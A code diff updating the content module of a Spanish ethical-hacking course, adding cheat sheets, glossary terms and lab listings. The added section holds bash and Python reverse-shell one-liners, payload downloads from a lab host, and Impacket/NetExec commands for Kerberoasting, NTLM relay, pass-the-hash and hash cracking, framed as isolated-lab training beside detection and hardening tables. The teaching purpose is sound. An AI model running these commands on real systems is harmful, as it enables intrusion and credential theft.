@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """Contenidos de apoyo para Hacking Ético Español:
 - Hojas de Referencia Rápida (Cheat Sheets)
-- Glosario técnico (65+ términos)
+- Glosario técnico (95+ términos)
 - Guía del Kit de Laboratorios
 - Fuentes, Estándares Abiertos y Límites Éticos
 """
@@ -23,8 +23,8 @@ CHEAT_SHEETS_HTML = """
 <pre><code class="lenguaje-bash"># Descubrimiento de hosts en subred de laboratorio (sin escaneo de puertos)
 nmap -sn 192.168.56.0/24
 
-# Escaneo TCP SYN rápido de los 1000 puertos más comunes + guardado en 3 formatos
-nmap -sS -T4 --open -oA escaneo_inicial 192.168.56.10
+# Escaneo TCP SYN rápido de los 1000 puertos más comunes + guardado en 3 formatos (requiere privilegios)
+sudo nmap -sS -T4 --open -oA escaneo_inicial 192.168.56.10
 
 # Escaneo completo de puertos TCP + detección de versiones y scripts seguros por defecto
 nmap -p- --min-rate 1500 -sV -sC -oA escaneo_completo 192.168.56.10
@@ -72,7 +72,7 @@ curl -sI http://127.0.0.1:5050/saludo-seguro</code></pre>
 <thead><tr><th>Vector / Riesgo en AD</th><th>Condición vulnerable</th><th>Telemetría clave (Event IDs)</th><th>Hardening obligatorio</th></tr></thead>
 <tbody>
 <tr><td><strong>AS-REP Roasting</strong></td><td>Cuentas con <code>DONT_REQ_PREAUTH</code> activado.</td><td><code>4768</code> (TGT sin pre-auth, cifrado <code>0x17</code> RC4).</td><td>Deshabilitar <code>Do not require Kerberos preauthentication</code> en todos los usuarios.</td></tr>
-<tr><td><strong>Kerberoasting</strong></td><td>Cuentas de servicio humanas con SPN y contraseña débil/RC4.</td><td><code>4769</code> (TGS con Ticket Encryption Type <code>0x17</code>).</td><td>Migrar a <strong>gMSA</strong> (contraseñas rotadas automáticamente de 120 bytes) y forzar AES256.</td></tr>
+<tr><td><strong>Kerberoasting</strong></td><td>Cuentas de servicio humanas con SPN y contraseña débil/RC4.</td><td><code>4769</code> (TGS con Ticket Encryption Type <code>0x17</code>).</td><td>Migrar a <strong>gMSA</strong> (contraseñas rotadas automáticamente de 240 bytes) y forzar AES256.</td></tr>
 <tr><td><strong>NTLM Relay</strong></td><td>SMB Signing deshabilitado o LDAP/HTTP ADCS sin EPA/Channel Binding.</td><td><code>4624</code>/<code>4776</code> NTLM anómalos entre hosts.</td><td>Habilitar <strong>SMB Signing</strong>, <strong>LDAP Signing + Channel Binding</strong> y <strong>EPA</strong>; deshabilitar NTLMv1.</td></tr>
 <tr><td><strong>Abuso de DACL / ACL</strong></td><td>Permisos <code>GenericAll</code>, <code>WriteDacl</code>, <code>WriteOwner</code> delegados a grupos amplios.</td><td><code>5136</code> (modificación de objeto AD) / <code>4662</code>.</td><td>Auditar grafos de privilegio (BloodHound/PingCastle) y aplicar modelo <strong>Tier 0/1/2</strong>.</td></tr>
 <tr><td><strong>DCSync</strong></td><td>Cuentas no-DC con <code>DS-Replication-Get-Changes-All</code>.</td><td><code>4662</code> sobre el objeto dominio desde IP no-DC.</td><td>Restringir replicación estrictamente a Controladores de Dominio y monitorear cambios en ACLs del dominio.</td></tr>
@@ -97,7 +97,7 @@ pypykatz lsa minidump /ruta/lab/lsass_dump.dmp</code></pre>
 <tr><td><strong>PowerShell 4104</strong></td><td>Script Block Logging (código completo ya desofuscado en memoria).</td><td><code>FromBase64String</code>, <code>IEX</code>, descargas remotas o desactivación de defensas.</td></tr>
 <tr><td><strong>Sysmon 3 / 22</strong></td><td>Conexión de red saliente / Consulta DNS asociada al proceso exacto.</td><td>LOLBins (<code>certutil</code>, <code>mshta</code>, <code>rundll32</code>) iniciando conexiones externas.</td></tr>
 <tr><td><strong>Sysmon 8 / 10</strong></td><td><code>CreateRemoteThread</code> / <code>ProcessAccess</code> entre procesos.</td><td>Acceso de lectura de memoria hacia <code>lsass.exe</code> desde un binario no autorizado.</td></tr>
-<tr><td><strong>Security 7045 / Sysmon 13</strong></td><td>Instalación de nuevo servicio / Modificación de claves de Registro.</td><td>Nuevos servicios con rutas en <code>C:\\Users\\Public</code> o cambios en claves <code>Run</code>.</td></tr>
+<tr><td><strong>System 7045 / Security 4697 / Sysmon 13</strong></td><td>Instalación de nuevo servicio (<code>7045</code> en log <code>System</code> vía SCM; equivalente <code>4697</code> en <code>Security</code>) / Registro.</td><td>Nuevos servicios con rutas en <code>C:\\Users\\Public</code> o cambios en claves <code>Run</code>.</td></tr>
 </tbody></table></div>
 <pre><code class="lenguaje-text"># Consulta rápida Splunk (SPL) — Top IPs con más de 10 fallos 4625 en 15 min
 index=windows EventCode=4625 | stats count dc(TargetUserName) as usuarios by IpAddress | where count &gt; 10 | sort - count
@@ -132,7 +132,7 @@ sha256sum evidencia.raw</code></pre>
 <thead><tr><th>Área Cloud / Contenedores</th><th>Control o comando clave de auditoría / hardening</th><th>Qué previene</th></tr></thead>
 <tbody>
 <tr><td><strong>IMDSv2 en AWS EC2</strong></td><td>Exigir <code>HttpTokens: required</code> y <code>HttpPutResponseHopLimit: 1</code></td><td>Robo de credenciales de rol IAM mediante SSRF o desde contenedores internos.</td></tr>
-<tr><td><strong>Docker rootless y mínimo</strong></td><td><code>docker run --read-only --cap-drop=ALL --security-opt=no-new-privileges:true</code></td><td>Escalada local y persistencia en contenedor tras vulnerabilidad en la aplicación.</td></tr>
+<tr><td><strong>Hardening en <code>docker run</code> y Docker rootless</strong></td><td><code>docker run --user 1000:1000 --read-only --cap-drop=ALL --security-opt=no-new-privileges:true</code> (hardening de ejecución) + modo <strong>Docker rootless</strong> real (correr <code>dockerd</code> sin <code>root</code> mediante <em>user namespaces</em>).</td><td>Escalada local y persistencia en contenedor tras vulnerabilidad en la aplicación.</td></tr>
 <tr><td><strong>Kubernetes Pod Security</strong></td><td>Perfil <code>restricted</code>, <code>runAsNonRoot: true</code>, <code>automountServiceAccountToken: false</code></td><td>Abuso de tokens de API, montaje <code>hostPath</code> y escapes hacia el nodo.</td></tr>
 <tr><td><strong>CI/CD y Secretos</strong></td><td><code>gitleaks detect</code>, <code>trivy config .</code>, <code>semgrep --config auto</code>, OIDC sin llaves</td><td>Fuga de secretos en Git, misconfigurations IaC e inyección en workflows.</td></tr>
 </tbody></table></div>
@@ -186,7 +186,76 @@ binwalk -e firmware_lab.bin</code></pre>
 <tr><td><strong>Proxies inversos AiTM</strong></td><td>Proxy intermedio que captura cookies autenticadas tras superar TOTP o SMS.</td><td>MFA resistente a phishing (<strong>FIDO2/WebAuthn</strong>), <em>Conditional Access</em> por dispositivo compatible y <em>Token Protection</em>.</td></tr>
 </tbody></table></div>
 
-<h2 id="cs-kit-laboratorios">11. Índice maestro del kit <code>laboratorios/</code> (Mapa archivo ↔ capítulo)</h2>
+<h2 id="cs-puertos-shells">11. Puertos comunes, Reverse Shells / TTY, PrivEsc, Impacket / NetExec y Hashcat</h2>
+<div class="tabla"><table>
+<thead><tr><th>Puerto(s)</th><th>Servicio</th><th>Vector o chequeo prioritario en laboratorio</th></tr></thead>
+<tbody>
+<tr><td><code>21</code> / <code>22</code> / <code>25</code></td><td>FTP / SSH / SMTP</td><td>Acceso anónimo FTP, autenticación por clave SSH, enumeración de usuarios SMTP.</td></tr>
+<tr><td><code>53</code> / <code>88</code> / <code>389</code> / <code>636</code></td><td>DNS / Kerberos / LDAP / LDAPS</td><td>Transferencias de zona, AS-REP/Kerberoasting, enumeración LDAP/ADIDNS, Channel Binding.</td></tr>
+<tr><td><code>80</code> / <code>443</code> / <code>8080</code> / <code>8443</code></td><td>HTTP / HTTPS</td><td>Fuzzing de rutas, OWASP Top 10, TLS/X.509, cabeceras de seguridad y APIs.</td></tr>
+<tr><td><code>135</code> / <code>139</code> / <code>445</code> / <code>5985</code></td><td>RPC / SMB / WinRM</td><td>Firma SMB (signing), shares administrativos, sesiones nulas, ejecución remota WinRM.</td></tr>
+<tr><td><code>161</code> / <code>502</code> / <code>3389</code></td><td>SNMP / Modbus TCP / RDP</td><td>Comunidades por defecto, control industrial sin auth (OT), RDP con NLA y Tiering.</td></tr>
+<tr><td><code>1433</code> / <code>3306</code> / <code>5432</code> / <code>6379</code></td><td>MSSQL / MySQL / PostgreSQL / Redis</td><td>Credenciales débiles, <code>xp_cmdshell</code>, autenticación obligatoria y enlace solo local.</td></tr>
+</tbody></table></div>
+
+<pre><code class="lenguaje-bash"># Listener local y reverse shells en laboratorio aislado (red Host-Only)
+nc -lvnp 4444
+bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.56.10/4444 0&gt;&amp;1'
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.56.10",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+
+# Upgrade de TTY interactivo en Linux (después de Ctrl+Z)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+stty raw -echo; fg
+export TERM=xterm; stty rows 40 cols 160
+
+# Transferencias de archivos en laboratorio controlado
+python3 -m http.server 8000
+curl -sO http://192.168.56.10:8000/linpeas.sh
+iwr -Uri http://192.168.56.10:8000/winPEASx64.exe -OutFile winPEASx64.exe
+impacket-smbserver share_lab ./compartido -smb2support</code></pre>
+
+<div class="tabla"><table>
+<thead><tr><th>Checklist PrivEsc</th><th>Comprobaciones manuales y triaje en laboratorio</th><th>Remediación estructural</th></tr></thead>
+<tbody>
+<tr><td><strong>Linux (Cap. 3.3)</strong></td><td><code>id; sudo -l</code> · SUID <code>find / -perm -4000 2&gt;/dev/null</code> · <code>getcap -r / 2&gt;/dev/null</code> · cron/timers · grupos <code>docker</code>/<code>lxd</code> · <code>./linpeas.sh -q</code> · <code>./pspy64 -pf -i 1000</code>.</td><td><code>NOEXEC</code> en <code>sudoers</code>, quitar SUID innecesarios, montar <code>/tmp</code> con <code>noexec,nosuid</code> y <code>hidepid=2</code> en <code>/proc</code>.</td></tr>
+<tr><td><strong>Windows (Cap. 3.4)</strong></td><td><code>whoami /all</code> (<code>SeImpersonate</code>, <code>SeBackup</code>) · rutas sin comillas y ACLs <code>icacls</code> · <code>PATH</code> escribible · <code>AlwaysInstallElevated</code> · <code>.\\winPEASx64.exe quiet servicesinfo systeminfo</code>.</td><td>LAPS, <code>RunAsPPL</code>, Credential Guard, <code>AlwaysInstallElevated = 0</code>, Vulnerable Driver Blocklist + HVCI y WDAC.</td></tr>
+</tbody></table></div>
+
+<pre><code class="lenguaje-bash"># Comandos clave de Active Directory: NetExec, Impacket, BloodHound y Certipy
+nxc smb 10.10.20.0/24 --shares -u usuario_lab -p 'ClaveLab!'
+nxc ldap dc01.corp.local -u usuario_lab -p 'ClaveLab!' --pass-pol --pre2k
+impacket-GetNPUsers corp.local/ -usersfile users_lab.txt -no-pass -dc-ip 10.10.20.10
+impacket-GetUserSPNs corp.local/usuario_lab:'ClaveLab!' -dc-ip 10.10.20.10 -request
+impacket-ntlmrelayx -tf objetivos_lab.txt -smb2support --no-dump
+impacket-psexec DOMINIO/admin_lab@10.10.20.30 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
+bloodhound-python -c All -d corp.local -u usuario_lab -p 'ClaveLab!' -ns 10.10.20.10 --zip
+certipy find -u usuario_lab@corp.local -p 'ClaveLab!' -dc-ip 10.10.20.10 -vulnerable -stdout</code></pre>
+
+<div class="tabla"><table>
+<thead><tr><th>Modo Hashcat</th><th>Tipo de hash / formato</th><th>Uso típico en auditoría (Cap. 3.2)</th></tr></thead>
+<tbody>
+<tr><td><code>-m 0</code> / <code>-m 100</code></td><td>MD5 / SHA-1 sin sal</td><td>Detección de almacenamiento inseguro heredado.</td></tr>
+<tr><td><code>-m 1000</code></td><td>NTLM (NT hash de Windows)</td><td>Auditoría de volcados SAM/NTDS y pruebas Pass-the-Hash.</td></tr>
+<tr><td><code>-m 5600</code></td><td>NetNTLMv2 (<code>usuario::DOM:reto:...</code>)</td><td>Desafío-respuesta capturado en laboratorio (no sirve para PtH).</td></tr>
+<tr><td><code>-m 13100</code> / <code>-m 18200</code></td><td>Kerberoasting (<code>$krb5tgs$23$</code>) / AS-REP (<code>$krb5asrep$23$</code>)</td><td>Tickets RC4 de cuentas de servicio sin gMSA o sin pre-auth.</td></tr>
+<tr><td><code>-m 1800</code> / <code>-m 3200</code></td><td>Linux sha512crypt (<code>$6$</code>) / bcrypt (<code>$2y$</code>)</td><td>Auditoría de políticas de contraseñas en <code>/etc/shadow</code> y apps web.</td></tr>
+<tr><td><code>-m 22000</code></td><td>WPA-PBKDF2-PMKID+EAPOL (formato <code>.hc22000</code>)</td><td>Evaluación de fuerza de claves Wi-Fi WPA/WPA2-PSK propias.</td></tr>
+</tbody></table></div>
+<pre><code class="lenguaje-bash"># Auditoría de diccionario + reglas con Hashcat (siempre en diccionario autorizado de lab)
+hashcat -m 1000 hashes_nt.txt wordlist_lab.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+
+<h2 id="cs-wireshark-vol">12. Filtros esenciales de Wireshark y plugins de Volatility 3</h2>
+<div class="tabla"><table>
+<thead><tr><th>Herramienta DFIR / Red</th><th>Filtro / Plugin clave</th><th>Propósito de investigación</th></tr></thead>
+<tbody>
+<tr><td><strong>Wireshark (Display)</strong></td><td><code>ip.addr == 192.168.56.10 &amp;&amp; tcp.port == 445</code></td><td>Aislar tráfico SMB de un host específico del laboratorio.</td></tr>
+<tr><td><strong>Wireshark (SYN / Auth)</strong></td><td><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code> · <code>smb2</code> · <code>kerberos</code></td><td>Detectar escaneos de puertos, actividad SMB2 o solicitudes de tickets.</td></tr>
+<tr><td><strong>Wireshark (Web / OT)</strong></td><td><code>http.request.method == "POST"</code> · <code>dns.qry.name</code> · <code>tls.handshake.type == 1</code> · <code>modbus</code></td><td>Inspeccionar envíos POST, consultas DNS/TLS ClientHello y escrituras ICS.</td></tr>
+<tr><td><strong>Volatility 3 (Sistema)</strong></td><td><code>windows.info</code> · <code>windows.pslist</code> · <code>windows.pstree</code> · <code>windows.psscan</code></td><td>Identificar perfil del kernel y detectar procesos ocultos o padres anómalos.</td></tr>
+<tr><td><strong>Volatility 3 (Red/Mem)</strong></td><td><code>windows.cmdline</code> · <code>windows.netscan</code> · <code>windows.malfind</code> · <code>linux.bash</code></td><td>Recuperar argumentos CLI, sockets abiertos y regiones RWX inyectadas.</td></tr>
+</tbody></table></div>
+
+<h2 id="cs-kit-laboratorios">13. Índice maestro del kit <code>laboratorios/</code> (Mapa archivo ↔ capítulo)</h2>
 <div class="tabla"><table>
 <thead><tr><th>Archivo en <code>laboratorios/</code></th><th>Capítulos</th><th>Objetivo práctico principal</th></tr></thead>
 <tbody>
@@ -237,7 +306,7 @@ GLOSARIO_ITEMS = [
     ("Falso Positivo (FP)", "Alerta disparada por un SIEM o IDS ante actividad legítima y benigna. Reducir falsos positivos mediante afinado es esencial para evitar fatiga de alertas en el SOC."),
     ("Forward Secrecy (PFS)", "Propiedad de intercambio de claves efímero (ECDHE) en TLS 1.2/1.3 que impide descifrar tráfico capturado en el pasado aunque la clave privada del servidor sea comprometida en el futuro."),
     ("Fuzzing Web", "Técnica automatizada de enviar listas controladas de rutas, vhosts o parámetros contra una aplicación autorizada (ej. con ffuf) para descubrir superficie expuesta o comportamientos anómalos."),
-    ("gMSA", "Group Managed Service Account. Cuenta de servicio de Active Directory cuya contraseña de 120 bytes es gestionada y rotada automáticamente por el dominio, eliminando el riesgo de Kerberoasting."),
+    ("gMSA", "Group Managed Service Account. Cuenta de servicio de Active Directory cuya contraseña de 240 bytes es gestionada y rotada automáticamente por el dominio, eliminando el riesgo de Kerberoasting."),
     ("GPO", "Group Policy Object. Objeto de configuración centralizada en Active Directory que aplica políticas de seguridad, scripts y configuraciones a equipos y usuarios de una OU."),
     ("GraphQL", "Lenguaje de consulta para APIs que expone un esquema tipado en un único endpoint; requiere controles explícitos de autorización por resolver, límite de profundidad y desactivación de introspección en producción."),
     ("Hardening", "Proceso sistemático de reducir la superficie de ataque de un sistema operativo, aplicación o dominio eliminando servicios innecesarios, aplicando mínimo privilegio y fortaleciendo configuraciones."),
@@ -334,6 +403,21 @@ GLOSARIO_ITEMS = [
     ("OAuth Consent Grant (Illicit)", "Técnica donde una aplicación de terceros solicita permisos delegados excesivos en M365 o Google Workspace (ej. Mail.Read, Files.Read.All) para acceder a datos sin robar la contraseña del usuario."),
     ("Prompt Injection (Directa / Indirecta)", "Inyección de instrucciones en un LLM: directa desde el chat del usuario, o indirecta oculta dentro de páginas web, correos o documentos recuperados por RAG o agentes."),
     ("RAG (Retrieval-Augmented Generation)", "Arquitectura que recupera fragmentos desde una base documental o vectorial para dárselos como contexto a un LLM; exige verificar permisos por documento antes de recuperar e inyectar el texto."),
+    ("C2 (Command and Control)", "Infraestructura y canal cifrado mediante el cual un agente o implant reporta estado y recibe tareas en ejercicios de Red Team; deja patrones temporales de beaconing observables por el SOC."),
+    ("CVE", "Common Vulnerabilities and Exposures. Identificador público único (ej. CVE-2025-53779) asignado a una vulnerabilidad concreta en software o firmware."),
+    ("CWE", "Common Weakness Enumeration. Catálogo estándar que clasifica la causa raíz estructural de un defecto de diseño o implementación (ej. CWE-89 SQLi, CWE-79 XSS)."),
+    ("EDR (Endpoint Detection and Response)", "Agente de detección y respuesta en endpoints basado en telemetría continua (ETW, Sysmon/eBPF, callbacks del kernel) para identificar y contener comportamientos maliciosos."),
+    ("Evil Twin", "Punto de acceso Wi-Fi fraudulento que imita el SSID y configuración de una red legítima para atraer clientes y capturar autenticaciones o tráfico."),
+    ("Exploit", "Código, secuencia de instrucciones o técnica que aprovecha una vulnerabilidad o mala configuración verificada dentro de un alcance autorizado."),
+    ("Golden Ticket", "Ticket TGT Kerberos falsificado con la clave secreta comprometida de la cuenta krbtgt del dominio; exige doble rotación de krbtgt para revocar su validez."),
+    ("Pass-the-Hash (PtH)", "Técnica que permite autenticarse ante servicios compatibles (SMB, WMI, WinRM) usando directamente el hash NT de la cuenta sin conocer la contraseña en claro."),
+    ("Payload", "Carga funcional ejecutada tras aprovechar una debilidad o vector de acceso (por ejemplo, validar una lectura segura de metadatos, abrir una sesión de prueba o emitir una petición OOB)."),
+    ("Ransomware", "Malware extorsivo que cifra archivos o datastores completos (incluido ESXi) y suele combinar exfiltración previa para doble extorsión; se mitiga con respaldos inmutables 3-2-1-1-0."),
+    ("Reverse Shell", "Sesión de comandos donde el equipo objetivo inicia una conexión saliente hacia un listener del auditor en laboratorio aislado para atravesar reglas de firewall entrantes."),
+    ("Salt / KDF", "Valor aleatorio único añadido a cada contraseña antes de procesarla con una Key Derivation Function lenta resistente a GPU (Argon2id, bcrypt, scrypt), impidiendo tablas precalculadas."),
+    ("SAML", "Security Assertion Markup Language. Estándar XML con firma digital usado en federación e inicio de sesión único (SSO) entre un proveedor de identidad (IdP) y aplicaciones (SP)."),
+    ("SOAR", "Security Orchestration, Automation, and Response. Plataforma que automatiza playbooks de respuesta en el SOC (enriquecimiento de IOCs, aislamiento de endpoints y gestión de alertas)."),
+    ("Zero Trust", "Modelo arquitectónico que elimina la confianza implícita basada en la red interna y verifica continuamente identidad, cumplimiento del dispositivo y mínimo privilegio en cada acceso."),
 ]
 
 LABORATORIOS_HTML = """
@@ -349,8 +433,9 @@ LABORATORIOS_HTML = """
 <div class="tabla"><table>
 <thead><tr><th>Archivo / Recurso</th><th>Capítulos donde se usa</th><th>Propósito técnico</th></tr></thead>
 <tbody>
-<tr><td><a href="laboratorios/docker-compose.yml"><code>docker-compose.yml</code></a></td><td>Tomo I (1.8) y Tomo II</td><td>Despliega la app educativa local en <code>127.0.0.1:5050</code>, Nginx en <code>127.0.0.1:8080</code> y perfil opcional <code>--profile owasp</code> (OWASP Juice Shop en <code>127.0.0.1:3000</code>).</td></tr>
-<tr><td><a href="laboratorios/app_lab_educativa.py"><code>app_lab_educativa.py</code></a></td><td>Cap. 1.8 y Tomo II (2.3–2.5)</td><td>Aplicación Flask + SQLite en memoria con endpoints seguros de referencia (SQL parametrizado, escape HTML + CSP, control anti-IDOR).</td></tr>
+<tr><td><a href="laboratorios/docker-compose.yml"><code>docker-compose.yml</code></a></td><td>Tomo I (1.1, 1.8) y Tomo II</td><td>Despliega <code>lab_local_web</code> en <code>127.0.0.1:5050</code>, <code>lab_local_nginx</code> en <code>127.0.0.1:8080</code> y perfil opcional <code>--profile owasp</code> (OWASP Juice Shop en <code>127.0.0.1:3000</code>).</td></tr>
+<tr><td><a href="laboratorios/dns_check_local.py"><code>dns_check_local.py</code></a></td><td>Cap. 1.1</td><td>Verificador local de resolución DNS/hosts en Python 3 estándar con marca temporal UTC para sellado <code>SHA-256</code>.</td></tr>
+<tr><td><a href="laboratorios/app_lab_educativa.py"><code>app_lab_educativa.py</code></a></td><td>Cap. 1.8 y Tomo II (2.3–2.6)</td><td>App Flask + SQLite en memoria (solo <code>127.0.0.1</code>) con endpoints gemelos <code>-vulnerable</code> y <code>-seguro</code> (SQLi, XSS reflejado/almacenado, IDOR, JWT débil, SSRF, SSTI y Upload) más <code>/telemetria-lab</code> para flujo Purple Team.</td></tr>
 <tr><td><a href="laboratorios/auditor_red_local.py"><code>auditor_red_local.py</code></a></td><td>Cap. 1.6 y 2.1</td><td>Inspector TCP y banners en Python 3 restringido por código a direcciones <code>127.0.0.0/8</code> y RFC 1918.</td></tr>
 <tr><td><a href="laboratorios/analizador_logs_soc.py"><code>analizador_logs_soc.py</code></a></td><td>Cap. 1.6, 4.3 y 4.6</td><td>Parser de logs SSH/HTTP en Python 3 que detecta fuerza bruta y escaneo 4xx emitiendo alertas JSON estructuradas.</td></tr>
 <tr><td><a href="laboratorios/diccionario_web_lab.txt"><code>diccionario_web_lab.txt</code></a></td><td>Cap. 2.2</td><td>Lista controlada de 40 rutas y parámetros comunes para practicar enumeración HTTP y calibración de filtros con <code>ffuf</code> en <code>127.0.0.1</code>.</td></tr>
@@ -401,22 +486,22 @@ FUENTES_LIMITES_HTML = """
 <p>Esta obra es un manual técnico independiente, libre y <strong>100 % original</strong> en español orientado al aprendizaje estructurado de la ciberseguridad ofensiva y defensiva.</p>
 
 <h2 id="origen-temario">Cómo se construyó el mapa curricular (transparencia total)</h2>
-<p>Para garantizar que el curso cubra habilidades reales demandadas en roles técnicos (Pentester, Analista Web, Especialista en Active Directory, Analista SOC e Ingeniero de Detección), se relevó únicamente la <strong>taxonomía pública</strong> de 358 módulos y 25 rutas de estudio del catálogo abierto de Hack The Box Academy (títulos, dificultades, categorías y agrupación de rutas) sin utilizar credenciales privadas ni reproducir texto, ejercicios o material propietario de terceros.</p>
+<p>Para garantizar que el curso cubra habilidades reales demandadas en roles técnicos (Pentester, Analista Web, Especialista en Active Directory, Analista SOC e Ingeniero de Detección), se relevó únicamente la <strong>taxonomía pública mínima</strong> de 358 temas y 25 rutas de referencia del catálogo abierto de Hack The Box Academy (título de referencia, nivel, categoría, dominio y enlace público), redactando toda la taxonomía en español sin descripciones ni textos de terceros.</p>
 <p>A partir de esa taxonomía y de los estándares internacionales abiertos de referencia, la obra consolidó <strong>55 capítulos originales distribuidos en 7 Tomos</strong>, redactados íntegramente desde documentación primaria y guías técnicas verificables.</p>
 
 <h2 id="estandares-abiertos">Estándares abiertos y documentación primaria de referencia</h2>
 <div class="tabla"><table>
 <thead><tr><th>Área temática</th><th>Fuentes y estándares de referencia</th></tr></thead>
 <tbody>
-<tr><td><strong>Metodología, Threat Modeling y GRC</strong></td><td>NIST SP 800-115, PTES, FIRST CVSS v3.1/v4, EPSS, STRIDE, PASTA, ISO/IEC 27001, NIST CSF 2.0, PCI-DSS v4.0, SOC 2, NIS2, DORA y GDPR.</td></tr>
-<tr><td><strong>Redes, Criptografía y Protocolos</strong></td><td>RFC 791 (IPv4), RFC 9293 (TCP), RFC 1035 (DNS), RFC 9110/9112 (HTTP), RFC 8446 (TLS 1.3), RFC 5280 (X.509 PKI), NIST SP 800-52 Rev. 2, NIST SP 800-38D (AES-GCM), NIST FIPS 203/204 (PQC), Nmap, tcpdump y Wireshark.</td></tr>
+<tr><td><strong>Metodología, Threat Modeling y GRC</strong></td><td>NIST SP 800-115, PTES, FIRST CVSS v3.1/v4.0, EPSS, STRIDE, PASTA, ISO/IEC 27001:2022, NIST CSF 2.0, PCI-DSS v4.0.1, SOC 2, NIS2, DORA, CRA y GDPR.</td></tr>
+<tr><td><strong>Redes, Criptografía y Protocolos</strong></td><td>RFC 791 (IPv4), RFC 9293 (TCP), RFC 1035 (DNS), RFC 9110/9112 (HTTP), RFC 8446 (TLS 1.3), RFC 5280 (X.509 PKI), CA/B Forum SC-081v3, NIST SP 800-52 Rev. 2, NIST SP 800-38D (AES-GCM), NIST FIPS 203/204 (PQC), Nmap, tcpdump y Wireshark.</td></tr>
 <tr><td><strong>Sistemas Operativos y Hardening</strong></td><td>Linux man-pages, documentación de systemd/auditd/AppArmor, CIS Benchmarks, Microsoft Learn (Windows Security, NTFS, PowerShell, WinEvent, Sysinternals).</td></tr>
-<tr><td><strong>Seguridad Web, APIs y Code Review</strong></td><td>OWASP Top 10, OWASP API Security Top 10, OWASP Web Security Testing Guide (WSTG), OWASP ASVS, OWASP Code Review Guide, OWASP Cheat Sheet Series, RFC 7519 (JWT) y RFC 6749/9700 (OAuth 2.0).</td></tr>
-<tr><td><strong>Active Directory, Red Team y OPSEC</strong></td><td>RFC 4120 (Kerberos v5), RFC 4556 (PKINIT), Microsoft Learn (AD DS, ADCS, Protected Users, gMSA, Tiering, Windows LAPS, MS-DRSR, AMSI/ETW), LOLBAS, GTFOBins y NIST SP 800-63B.</td></tr>
-<tr><td><strong>SOC, SIEM, NSM, Detection &amp; DFIR</strong></td><td>NIST SP 800-61 Rev. 3 (Incident Handling), MITRE ATT&amp;CK / CAR / D3FEND, RFC 3227, RFC 7208/6376/7489 (SPF/DKIM/DMARC), SigmaHQ, YARA, Suricata, Zeek, Elastic ECS, Splunk CIM y Volatility 3.</td></tr>
+<tr><td><strong>Seguridad Web, APIs y Code Review</strong></td><td>OWASP Top 10:2025, OWASP API Security Top 10 (2023), OWASP Web Security Testing Guide (WSTG), OWASP ASVS 5.0, OWASP Code Review Guide, OWASP Cheat Sheet Series, RFC 7519 (JWT) y RFC 6749/9700 (OAuth 2.0).</td></tr>
+<tr><td><strong>Active Directory, Red Team y OPSEC</strong></td><td>RFC 4120 (Kerberos v5), RFC 4556 (PKINIT), Microsoft Learn (AD DS, ADCS, KB5014754, Protected Users, gMSA, Tiering, Windows LAPS, MS-DRSR, AMSI/ETW), LOLBAS, GTFOBins y NIST SP 800-63B-4.</td></tr>
+<tr><td><strong>SOC, SIEM, NSM, Detection &amp; DFIR</strong></td><td>NIST SP 800-61 Rev. 3 (CSF 2.0 Incident Response), MITRE ATT&amp;CK / CAR / D3FEND, RFC 3227, RFC 7208/6376/7489 (SPF/DKIM/DMARC), SigmaHQ, YARA, Suricata, Zeek, Elastic ECS, Splunk CIM y Volatility 3.</td></tr>
 <tr><td><strong>Cloud, Contenedores y DevSecOps</strong></td><td>AWS/Azure/GCP Security &amp; Well-Architected Docs, CIS Docker &amp; Kubernetes Benchmarks, Kubernetes Pod Security Standards, Terraform/Trivy/Sigstore y OWASP CI/CD Security Risks.</td></tr>
-<tr><td><strong>Mobile, Wireless, IoT y OT/ICS</strong></td><td>OWASP MASTG / MASVS (Android/iOS), IEEE 802.11 (WEP/WPA2/WPA3-SAE/802.1X), IEC 62443 / NIST SP 800-82 (OT/ICS y Modelo Purdue).</td></tr>
-<tr><td><strong>Inteligencia Artificial, LLMs y Agentes</strong></td><td>OWASP Top 10 for LLM Applications, MITRE ATLAS, NIST AI RMF 1.0 / AI 600-1, ISO/IEC 42001 y especificaciones de seguridad para MCP.</td></tr>
+<tr><td><strong>Mobile, Wireless, IoT y OT/ICS</strong></td><td>OWASP MASTG / MASVS / Mobile Top 10:2024 (Android/iOS), IEEE 802.11 (WEP/WPA2/WPA3-SAE/802.1X), IEC 62443 / NIST SP 800-82 (OT/ICS y Modelo Purdue).</td></tr>
+<tr><td><strong>Inteligencia Artificial, LLMs y Agentes</strong></td><td>OWASP Top 10 for LLM Applications 2025, OWASP Top 10 for Agentic Applications (2025), MITRE ATLAS, NIST AI RMF 1.0 / AI 600-1, ISO/IEC 42001 y especificaciones MCP.</td></tr>
 </tbody></table></div>
 
 <h2 id="puente-cls-guia">Puente curricular con la obra hermana: Curso de Reversing en Windows</h2>
@@ -430,7 +515,7 @@ FUENTES_LIMITES_HTML = """
 <tr><td><em>Dynamic Analysis with WinDbg / Windows Kernel Telemetry &amp; ETW</em></td><td><a href="../CLS_Guia/2d.html">Curso de Reversing · Rama 2D (Windows Internals, VAD, ETW, COM/RPC)</a> y <a href="../CLS_Guia/guia/etapa-6.html">Etapa 6 (Kernel y WinDbg)</a>.</td></tr>
 </tbody></table></div>
 
-<h2 id="alcance-y-exclusiones">Alcance integral de la Edición 2.0 (Hiper Biblioteca)</h2>
+<h2 id="alcance-y-exclusiones">Alcance integral de la Edición 2.1 (Hiper Biblioteca)</h2>
 <ul>
   <li><strong>Incluido en profundidad (348 módulos HTB mapeados + expansión integral → 55 capítulos en 7 Tomos):</strong>
     <ul>
